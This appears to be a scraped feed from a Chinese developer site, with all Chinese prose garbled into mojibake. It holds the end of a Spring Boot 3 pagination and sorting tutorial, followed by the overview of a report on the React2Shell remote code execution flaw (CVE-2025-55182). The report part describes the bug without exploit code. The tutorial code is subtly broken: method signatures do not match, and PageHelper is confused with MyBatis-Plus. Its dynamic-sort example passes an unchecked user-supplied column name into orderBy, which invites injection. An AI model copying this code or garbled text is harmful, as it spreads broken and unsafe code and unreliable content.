<p><strong>åœ¨ Service å±‚å®ç°åˆ†é¡µæŸ¥è¯¢</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Service</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UserService</span> {
    <span class="hljs-meta">@Autowired</span>
    <span class="hljs-keyword">private</span> UserRepository userRepository;

    <span class="hljs-keyword">public</span> Page&lt;User&gt; <span class="hljs-title function_">getUsers</span><span class="hljs-params">(<span class="hljs-type">int</span> pageNumber, <span class="hljs-type">int</span> pageSize)</span> {
        <span class="hljs-type">Pageable</span> <span class="hljs-variable">pageable</span> <span class="hljs-operator">=</span> PageRequest.of(pageNumber, pageSize, Sort.by(Sort.Direction.ASC, <span class="hljs-string">"id"</span>));
        <span class="hljs-keyword">return</span> userRepository.findAll(pageable);
    }
}
</code></pre>
<p><strong>åœ¨ Controller å±‚æš´éœ²æ¥å£</strong></p>
<pre><code class="hljs language-less" lang="less"><span class="hljs-variable">@RestController</span>
<span class="hljs-variable">@RequestMapping</span>(<span class="hljs-string">"/users"</span>)
public class UserController {
    <span class="hljs-variable">@Autowired</span>
    private UserService userService;

    <span class="hljs-variable">@GetMapping</span>
    public Page&lt;User&gt; <span class="hljs-built_in">getUsers</span>(<span class="hljs-variable">@RequestParam</span>(defaultValue = <span class="hljs-string">"0"</span>) int page,
                               <span class="hljs-variable">@RequestParam</span>(defaultValue = <span class="hljs-string">"10"</span>) int size) {
        <span class="hljs-selector-tag">return</span> <span class="hljs-selector-tag">userService</span><span class="hljs-selector-class">.getUsers</span>(page, size);
    }
}
</code></pre>
<p>æ­¤æ—¶ï¼Œè®¿é—®/users?page=0&amp;size=10ï¼Œå°±å¯ä»¥è·å–åˆ°ç¬¬ä¸€é¡µï¼Œæ¯é¡µ 10 æ¡æ•°æ®çš„ç”¨æˆ·åˆ—è¡¨ã€‚</p>
<h2 data-id="heading-4">åŸºäº MyBatis - Plus çš„å®Œæ•´ç¤ºä¾‹</h2>
<p><strong>åˆ›å»ºå®ä½“ç±»</strong></p>
<p>åŒæ ·æ˜¯Userå®ä½“ç±»ï¼Œä¸ Spring Data JPA ç¤ºä¾‹ä¸­çš„å®ä½“ç±»ç±»ä¼¼ã€‚</p>
<pre><code class="hljs language-arduino" lang="arduino"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">User</span> {
    <span class="hljs-keyword">private</span> Long id;
    <span class="hljs-keyword">private</span> <span class="hljs-type">String</span> username;
    <span class="hljs-keyword">private</span> <span class="hljs-type">String</span> email;
    <span class="hljs-comment">// å…¶ä»–å­—æ®µåŠGetterã€Setteræ–¹æ³•çœç•¥</span>
}
</code></pre>
<p><strong>åˆ›å»º Mapper æ¥å£</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Mapper</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">UserMapper</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">BaseMapper</span>&lt;User&gt; {
}
</code></pre>
<p><strong>åœ¨ Service å±‚å®ç°åˆ†é¡µæŸ¥è¯¢</strong></p>
<p>å‰æ–‡å·²ç»å±•ç¤ºè¿‡è¯¥éƒ¨åˆ†ä»£ç ï¼Œé€šè¿‡PageHelper.startPageæ–¹æ³•å¼€å¯åˆ†é¡µï¼Œç„¶åæ‰§è¡ŒæŸ¥è¯¢é€»è¾‘ã€‚</p>
<p><strong>åœ¨ Controller å±‚æš´éœ²æ¥å£</strong></p>
<pre><code class="hljs language-less" lang="less"><span class="hljs-variable">@RestController</span>
<span class="hljs-variable">@RequestMapping</span>(<span class="hljs-string">"/users"</span>)
public class UserController {
    <span class="hljs-variable">@Autowired</span>
    private UserService userService;

    <span class="hljs-variable">@GetMapping</span>(<span class="hljs-string">"/paged"</span>)
    public JSONResult <span class="hljs-built_in">queryUserListPaged</span>(<span class="hljs-variable">@RequestParam</span>(required = false, defaultValue = <span class="hljs-string">"1"</span>) Integer page) {
        <span class="hljs-selector-tag">int</span> <span class="hljs-selector-tag">pageSize</span> = <span class="hljs-number">10</span>;
        <span class="hljs-selector-tag">SysUser</span> <span class="hljs-selector-tag">user</span> = <span class="hljs-selector-tag">new</span> <span class="hljs-selector-tag">SysUser</span>();
        <span class="hljs-selector-tag">List</span>&lt;<span class="hljs-selector-tag">User</span>&gt; <span class="hljs-selector-tag">userList</span> = <span class="hljs-selector-tag">userService</span><span class="hljs-selector-class">.queryUserListPaged</span>(user, page, pageSize);
        <span class="hljs-selector-tag">return</span> <span class="hljs-selector-tag">JSONResult</span><span class="hljs-selector-class">.ok</span>(userList);
    }
}
</code></pre>
<p>è®¿é—®/users/paged?page=1ï¼Œå³å¯è·å–åˆ°ä½¿ç”¨ MyBatis - Plus åˆ†é¡µåçš„ç”¨æˆ·åˆ—è¡¨æ•°æ®ã€‚</p>
<h2 data-id="heading-5">åˆ†é¡µæ“ä½œä¸­çš„æ€§èƒ½ä¼˜åŒ–ä¸æ³¨æ„äº‹é¡¹</h2>
<p><strong>ï¼ˆä¸€ï¼‰æ€§èƒ½ä¼˜åŒ–</strong></p>
<p><strong>åˆç†è®¾ç½®æ¯é¡µæ•°æ®é‡</strong>ï¼šå¦‚æœæ¯é¡µæ•°æ®é‡è®¾ç½®è¿‡å¤§ï¼Œä¼šå¢åŠ å•æ¬¡æŸ¥è¯¢çš„æ•°æ®é‡ï¼Œå½±å“æŸ¥è¯¢é€Ÿåº¦ï¼›å¦‚æœè®¾ç½®è¿‡å°ï¼Œä¼šå¯¼è‡´é¢‘ç¹æŸ¥è¯¢æ•°æ®åº“ï¼ŒåŒæ ·é™ä½æ€§èƒ½ã€‚ä¸€èˆ¬æ¥è¯´ï¼Œéœ€è¦æ ¹æ®å®é™…ä¸šåŠ¡åœºæ™¯å’Œæ•°æ®é‡å¤§å°ï¼Œç»è¿‡æµ‹è¯•æ¥ç¡®å®šä¸€ä¸ªåˆé€‚çš„æ¯é¡µæ•°æ®é‡ï¼Œä¾‹å¦‚å¸¸è§çš„ 10 æ¡ã€20 æ¡æˆ– 50 æ¡ã€‚</p>
<p><strong>ä½¿ç”¨ç´¢å¼•</strong>ï¼šå¯¹ç»å¸¸ç”¨äºæ’åºå’Œåˆ†é¡µçš„å­—æ®µæ·»åŠ ç´¢å¼•ï¼Œå¯ä»¥æ˜¾è‘—æå‡æŸ¥è¯¢é€Ÿåº¦ã€‚æ¯”å¦‚åœ¨åŸºäº Spring Data JPA çš„åˆ†é¡µä¸­ï¼Œå¦‚æœæŒ‰ç…§idå­—æ®µè¿›è¡Œæ’åºå’Œåˆ†é¡µï¼Œç¡®ä¿idå­—æ®µä¸Šæœ‰ç´¢å¼•ã€‚åœ¨ MySQL ä¸­ï¼Œå¯ä»¥ä½¿ç”¨CREATE INDEXè¯­å¥æ¥åˆ›å»ºç´¢å¼•ã€‚</p>
<p><strong>é¿å…å…¨è¡¨æ‰«æ</strong>ï¼šåœ¨ç¼–å†™æŸ¥è¯¢è¯­å¥æ—¶ï¼Œè¦å°½é‡é¿å…ä½¿ç”¨SELECT *ï¼Œè€Œæ˜¯æ˜ç¡®æŒ‡å®šéœ€è¦æŸ¥è¯¢çš„å­—æ®µã€‚è¿™æ ·å¯ä»¥å‡å°‘æ•°æ®ä¼ è¾“é‡ï¼Œæé«˜æŸ¥è¯¢æ•ˆç‡ã€‚åŒæ—¶ï¼Œåˆç†ä½¿ç”¨æŸ¥è¯¢æ¡ä»¶ï¼Œç¼©å°æŸ¥è¯¢èŒƒå›´ï¼Œé¿å…å¯¹æ•´ä¸ªè¡¨è¿›è¡Œæ‰«æã€‚</p>
<p><strong>ï¼ˆäºŒï¼‰æ³¨æ„äº‹é¡¹</strong></p>
<p><strong>è°ƒç”¨é¡ºåº</strong>ï¼šåœ¨ä½¿ç”¨ MyBatis - Plus çš„PageHelperæ’ä»¶æ—¶ï¼ŒstartPage()æ–¹æ³•å¿…é¡»ç´§è´´åœ¨æŸ¥è¯¢æ–¹æ³•ä¹‹å‰è°ƒç”¨ï¼Œå¦åˆ™åˆ†é¡µå°†æ— æ³•ç”Ÿæ•ˆã€‚è¿™æ˜¯å› ä¸ºPageHelperæ˜¯é€šè¿‡æ‹¦æˆªå™¨æœºåˆ¶æ¥å®ç°åˆ†é¡µçš„ï¼Œåªæœ‰æ­£ç¡®çš„è°ƒç”¨é¡ºåºæ‰èƒ½ç¡®ä¿æ‹¦æˆªå™¨å‡†ç¡®åœ°å¯¹æŸ¥è¯¢ SQL è¿›è¡Œæ”¹å†™ã€‚</p>
<p><strong>çº¿ç¨‹å®‰å…¨</strong>ï¼šåœ¨å¼‚æ­¥æˆ–å¤šçº¿ç¨‹åœºæ™¯ä¸‹ï¼Œä½¿ç”¨PageHelperæ—¶éœ€è¦ç‰¹åˆ«æ³¨æ„çº¿ç¨‹å®‰å…¨é—®é¢˜ã€‚ç”±äºPageHelperå†…éƒ¨ä¾èµ–ThreadLocalæ¥ä¼ é€’åˆ†é¡µå‚æ•°ï¼Œå¦‚æœåœ¨å¤šçº¿ç¨‹ç¯å¢ƒä¸‹ä½¿ç”¨ä¸å½“ï¼Œå¯èƒ½ä¼šå¯¼è‡´å‚æ•°æ··ä¹±ï¼Œå½±å“åˆ†é¡µç»“æœã€‚æ­¤æ—¶ï¼Œå¯èƒ½éœ€è¦æ‰‹åŠ¨ä¼ é€’åˆ†é¡µå‚æ•°ï¼Œä»¥ç¡®ä¿æ¯ä¸ªçº¿ç¨‹çš„åˆ†é¡µæ“ä½œç‹¬ç«‹ä¸”æ­£ç¡®ã€‚</p>
<p><strong>å¤„ç†ç©ºé¡µå’Œè¶Šç•Œ</strong>ï¼šåœ¨è¿”å›åˆ†é¡µç»“æœæ—¶ï¼Œéœ€è¦è€ƒè™‘åˆ°ç©ºé¡µï¼ˆå³æŸ¥è¯¢ç»“æœä¸ºç©ºï¼‰å’Œè¶Šç•Œï¼ˆè¯·æ±‚çš„é¡µç è¶…å‡ºäº†å®é™…çš„é¡µç èŒƒå›´ï¼‰çš„æƒ…å†µã€‚å¯¹äºç©ºé¡µï¼Œåº”è¿”å›ä¸€ä¸ªåˆé€‚çš„æç¤ºä¿¡æ¯ï¼Œè€Œä¸æ˜¯è®©å‰ç«¯æ˜¾ç¤ºç©ºç™½é¡µé¢ï¼›å¯¹äºè¶Šç•Œæƒ…å†µï¼Œé€šå¸¸åº”è¿”å›æœ€åä¸€é¡µçš„æ•°æ®ï¼Œæˆ–è€…ç»™å‡ºæ˜ç¡®çš„é”™è¯¯æç¤ºï¼Œå‘ŠçŸ¥ç”¨æˆ·è¯·æ±‚çš„é¡µç æ— æ•ˆã€‚</p>
<h2 data-id="heading-6">åŠ¨æ€æ’åºçš„å®ç°</h2>
<p>åœ¨å®é™…ä¸šåŠ¡ä¸­ï¼Œé™¤äº†åˆ†é¡µï¼ŒåŠ¨æ€æ’åºä¹Ÿæ˜¯éå¸¸å¸¸è§çš„éœ€æ±‚ã€‚ç”¨æˆ·å¯èƒ½å¸Œæœ›æ ¹æ®ä¸åŒçš„å­—æ®µï¼Œå¦‚åˆ›å»ºæ—¶é—´ã€ä»·æ ¼ã€è¯„è®ºæ•°é‡ç­‰å¯¹æ•°æ®è¿›è¡Œæ’åºã€‚åœ¨ Spring Boot3 ä¸­ï¼ŒåŸºäº Spring Data JPA å’Œ MyBatis - Plus éƒ½èƒ½è½»æ¾å®ç°åŠ¨æ€æ’åºã€‚</p>
<p><strong>ï¼ˆä¸€ï¼‰åŸºäº Spring Data JPA çš„åŠ¨æ€æ’åº</strong></p>
<p>é€šè¿‡Sortå¯¹è±¡æˆ–Pageableçš„æ’åºå‚æ•°å¯ä»¥æ”¯æŒåŠ¨æ€æ’åºã€‚ä¾‹å¦‚ï¼Œæˆ‘ä»¬å¸Œæœ›æŒ‰ç…§ç”¨æˆ·çš„emailå­—æ®µè¿›è¡Œé™åºæ’åºï¼Œå¯ä»¥è¿™æ ·å®ç°ï¼š</p>
<pre><code class="hljs language-ini" lang="ini">Sort <span class="hljs-attr">sort</span> = Sort.by(Sort.Direction.DESC, <span class="hljs-string">"email"</span>)<span class="hljs-comment">;</span>
Pageable <span class="hljs-attr">pageable</span> = PageRequest.of(pageNumber, pageSize, sort)<span class="hljs-comment">;</span>
Page&lt;User&gt; <span class="hljs-attr">users</span> = userRepository.findAll(pageable)<span class="hljs-comment">;</span>
</code></pre>
<p>è¿™é‡Œé€šè¿‡Sort.byæ–¹æ³•åˆ›å»ºäº†ä¸€ä¸ªæŒ‰ç…§emailå­—æ®µé™åºæ’åˆ—çš„Sortå¯¹è±¡ï¼Œç„¶åå°†å…¶åº”ç”¨åˆ°Pageableå®ä¾‹ä¸­ï¼Œæœ€ç»ˆåœ¨æŸ¥è¯¢æ—¶å®ç°äº†åŠ¨æ€æ’åºã€‚</p>
<p><strong>ï¼ˆäºŒï¼‰åŸºäº MyBatis - Plus çš„åŠ¨æ€æ’åº</strong></p>
<p>åœ¨ MyBatis - Plus ä¸­ï¼ŒåŒæ ·å¯ä»¥é€šè¿‡åœ¨PageHelper.startPageæ–¹æ³•ä¹‹åï¼Œå¯¹æŸ¥è¯¢æ¡ä»¶è¿›è¡ŒåŠ¨æ€æ’åºè®¾ç½®ã€‚å‡è®¾æˆ‘ä»¬æœ‰ä¸€ä¸ªæ ¹æ®ç”¨æˆ·è¾“å…¥çš„æ’åºå­—æ®µå’Œæ’åºæ–¹å‘è¿›è¡Œæ’åºçš„éœ€æ±‚ï¼Œå¯ä»¥è¿™æ ·å®ç°ï¼š</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-meta">@Service</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UserServiceImpl</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">UserService</span> {
    <span class="hljs-meta">@Autowired</span>
    <span class="hljs-keyword">private</span> <span class="hljs-title class_">UserMapper</span> userMapper;

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-title class_">List</span>&lt;<span class="hljs-title class_">User</span>&gt; <span class="hljs-title function_">queryUserListPaged</span>(<span class="hljs-params">SysUser user, Integer page, Integer pageSize, <span class="hljs-built_in">String</span> sortField, <span class="hljs-built_in">String</span> sortDirection</span>) {
        <span class="hljs-title class_">PageHelper</span>.<span class="hljs-title function_">startPage</span>(page, pageSize);
        <span class="hljs-title class_">QueryWrapper</span>&lt;<span class="hljs-title class_">User</span>&gt; wrapper = <span class="hljs-keyword">new</span> <span class="hljs-title class_">QueryWrapper</span>&lt;&gt;();
        <span class="hljs-keyword">if</span> (!<span class="hljs-title class_">StringUtils</span>.<span class="hljs-title function_">isEmpty</span>(sortField) &amp;&amp;!<span class="hljs-title class_">StringUtils</span>.<span class="hljs-title function_">isEmpty</span>(sortDirection)) {
            wrapper.<span class="hljs-title function_">orderBy</span>(<span class="hljs-literal">true</span>, <span class="hljs-string">"asc"</span>.<span class="hljs-title function_">equalsIgnoreCase</span>(sortDirection), sortField);
        }
        <span class="hljs-keyword">if</span> (!<span class="hljs-title class_">StringUtils</span>.<span class="hljs-title function_">isEmptyOrWhitespace</span>(user.<span class="hljs-title function_">getUsername</span>())) {
            wrapper.<span class="hljs-title function_">like</span>(<span class="hljs-string">"username"</span>, <span class="hljs-string">"%"</span> + user.<span class="hljs-title function_">getUsername</span>() + <span class="hljs-string">"%"</span>);
        }
        <span class="hljs-keyword">if</span> (!<span class="hljs-title class_">StringUtils</span>.<span class="hljs-title function_">isEmptyOrWhitespace</span>(user.<span class="hljs-title function_">getNickname</span>())) {
            wrapper.<span class="hljs-title function_">like</span>(<span class="hljs-string">"nickname"</span>, <span class="hljs-string">"%"</span> + user.<span class="hljs-title function_">getNickname</span>() + <span class="hljs-string">"%"</span>);
        }
        <span class="hljs-title class_">List</span>&lt;<span class="hljs-title class_">User</span>&gt; userList = userMapper.<span class="hljs-title function_">selectList</span>(wrapper);
        <span class="hljs-keyword">return</span> userList;
    }
}
</code></pre>
<p>åœ¨ä¸Šè¿°ä»£ç ä¸­ï¼Œé€šè¿‡QueryWrapperçš„orderByæ–¹æ³•ï¼Œæ ¹æ®ä¼ å…¥çš„sortFieldå’ŒsortDirectionå‚æ•°å®ç°äº†åŠ¨æ€æ’åºåŠŸèƒ½ã€‚</p>
<h2 data-id="heading-7">æ€»ç»“</h2>
<p>åœ¨ Spring Boot3 ä¸­å®ç°åˆ†é¡µæ“ä½œï¼Œæ— è®ºæ˜¯åŸºäº Spring Data JPA è¿˜æ˜¯ MyBatis - Plusï¼Œéƒ½ä¸ºå¼€å‘è€…æä¾›äº†å¼ºå¤§ä¸”ä¾¿æ·çš„å·¥å…·ã€‚é€šè¿‡åˆç†è¿ç”¨è¿™äº›æŠ€æœ¯ï¼Œèƒ½å¤Ÿæœ‰æ•ˆåœ°å¤„ç†æµ·é‡æ•°æ®ï¼Œæå‡åº”ç”¨ç¨‹åºçš„æ€§èƒ½å’Œç”¨æˆ·ä½“éªŒã€‚åœ¨å®é™…å¼€å‘è¿‡ç¨‹ä¸­ï¼Œè¦æ ¹æ®é¡¹ç›®çš„å…·ä½“éœ€æ±‚ã€æ•°æ®åº“ç±»å‹ä»¥åŠå›¢é˜ŸæŠ€æœ¯æ ˆç­‰å› ç´ ï¼Œé€‰æ‹©åˆé€‚çš„åˆ†é¡µå®ç°æ–¹å¼ï¼Œå¹¶æ³¨é‡æ€§èƒ½ä¼˜åŒ–å’Œå„ç§æ³¨æ„äº‹é¡¹ã€‚å¸Œæœ›æœ¬æ–‡èƒ½ä¸ºå„ä½äº’è”ç½‘è½¯ä»¶å¼€å‘äººå‘˜åœ¨ Spring Boot3 åˆ†é¡µæ“ä½œçš„å­¦ä¹ å’Œå®è·µä¸­æä¾›å…¨é¢è€Œæœ‰æ•ˆçš„å¸®åŠ©ï¼Œè®©å¤§å®¶åœ¨å¼€å‘ä¹‹è·¯ä¸Šæ¸¸åˆƒæœ‰ä½™ã€‚å¦‚æœä½ åœ¨å®é™…æ“ä½œä¸­æœ‰ä»»ä½•ç–‘é—®æˆ–å¿ƒå¾—ï¼Œæ¬¢è¿åœ¨è¯„è®ºåŒºç•™è¨€åˆ†äº«ï¼Œå’±ä»¬ä¸€èµ·æ¢è®¨è¿›æ­¥ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[CVE-2025-55182 React Server Components "React2Shell" æ·±åº¦è°ƒæŸ¥ä¸å…¨é“¾è·¯å“åº”æŠ¥å‘Š]]></title>    <link>https://juejin.cn/post/7580740782932492330</link>    <guid>https://juejin.cn/post/7580740782932492330</guid>    <pubDate>2025-12-08T02:55:24.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7580740782932492330" data-draft-id="7580327140962811910" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="CVE-2025-55182 React Server Components &quot;React2Shell&quot; æ·±åº¦è°ƒæŸ¥ä¸å…¨é“¾è·¯å“åº”æŠ¥å‘Š"/> <meta itemprop="keywords" content="React.js,Next.js"/> <meta itemprop="datePublished" content="2025-12-08T02:55:24.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="HexCIer"/> <meta itemprop="url" content="https://juejin.cn/user/571401774825901"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            CVE-2025-55182 React Server Components "React2Shell" æ·±åº¦è°ƒæŸ¥ä¸å…¨é“¾è·¯å“åº”æŠ¥å‘Š
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/571401774825901/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    HexCIer
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-08T02:55:24.000Z" title="Mon Dec 08 2025 02:55:24 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    3
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»11åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">1. æ¦‚è¿°</h2>
<p>åœ¨å½“ä»£ Web å¼€å‘ç”Ÿæ€ç³»ç»Ÿä¸­ï¼ŒReact åŠå…¶è¡ç”Ÿæ¡†æ¶ï¼ˆå°¤å…¶æ˜¯ Next.jsï¼‰æ„æˆäº†äº’è”ç½‘åŸºç¡€è®¾æ–½çš„åŸºçŸ³ã€‚æ®ç»Ÿè®¡ï¼Œå…¨çƒæ’åå‰ 10,000 çš„ç½‘ç«™ä¸­æœ‰è¶…è¿‡ 40% ä¾èµ– React æŠ€æœ¯æ ˆæ„å»ºã€‚2025å¹´12æœˆ3æ—¥ï¼Œéšç€ CVE-2025-55182 çš„æŠ«éœ²ï¼Œè¿™ä¸€åºå¤§çš„æ•°å­—åŸºç¡€è®¾æ–½é¢ä¸´ç€å‰æ‰€æœªæœ‰çš„ä¸¥å³»æŒ‘æˆ˜ã€‚è¯¥æ¼æ´è¢«å®‰å…¨ç¤¾åŒºå‘½åä¸º "React2Shell"ï¼Œä¸ä»…å› å…¶æŠ€æœ¯æœºåˆ¶ç±»ä¼¼äºè‘—åçš„ Log4Shellï¼Œæ›´å› å…¶å…·å¤‡äº†â€œæ ¸å¼¹çº§â€æ¼æ´çš„æ‰€æœ‰ç‰¹å¾ï¼šé›¶é—¨æ§›åˆ©ç”¨ã€æ— éœ€èº«ä»½éªŒè¯ã€è¿œç¨‹ä»£ç æ‰§è¡Œï¼ˆRCEï¼‰ä»¥åŠ CVSS 10.0 çš„æ»¡åˆ†ä¸¥é‡è¯„çº§ã€‚</p>
<p>CVE-2025-55182 çš„æ ¸å¿ƒåœ¨äº React Server Componentsï¼ˆRSCï¼‰æ‰€ä½¿ç”¨çš„åº•å±‚é€šä¿¡åè®®â€”â€”"Flight" åè®®â€”â€”åœ¨å¤„ç†æ•°æ®ååºåˆ—åŒ–æ—¶å­˜åœ¨æ ¹æœ¬æ€§çš„é€»è¾‘ç¼ºé™·ã€‚æ”»å‡»è€…ä»…éœ€å‘å¯ç”¨ RSC çš„æœåŠ¡å™¨ç«¯ç‚¹å‘é€ä¸€ä¸ªç²¾å¿ƒæ„é€ çš„ HTTP è¯·æ±‚ï¼Œå³å¯è§¦å‘æœåŠ¡å™¨ç«¯çš„æ¶æ„å¯¹è±¡å®ä¾‹åŒ–ï¼Œè¿›è€Œæ§åˆ¶æœåŠ¡å™¨è¿›ç¨‹æ‰§è¡Œä»»æ„æŒ‡ä»¤ã€‚è¿™ä¸€è¿‡ç¨‹æ— éœ€æ”»å‡»è€…å…·å¤‡ä»»ä½•é¢„å…ˆçš„ç³»ç»Ÿè®¿é—®æƒé™æˆ–ç”¨æˆ·å‡­è¯ï¼Œä¸”é»˜è®¤é…ç½®ä¸‹çš„ Next.js åº”ç”¨å³å—å½±å“ï¼Œä½¿å…¶æ”»å‡»é¢æä¸ºå¹¿æ³›ã€‚</p>
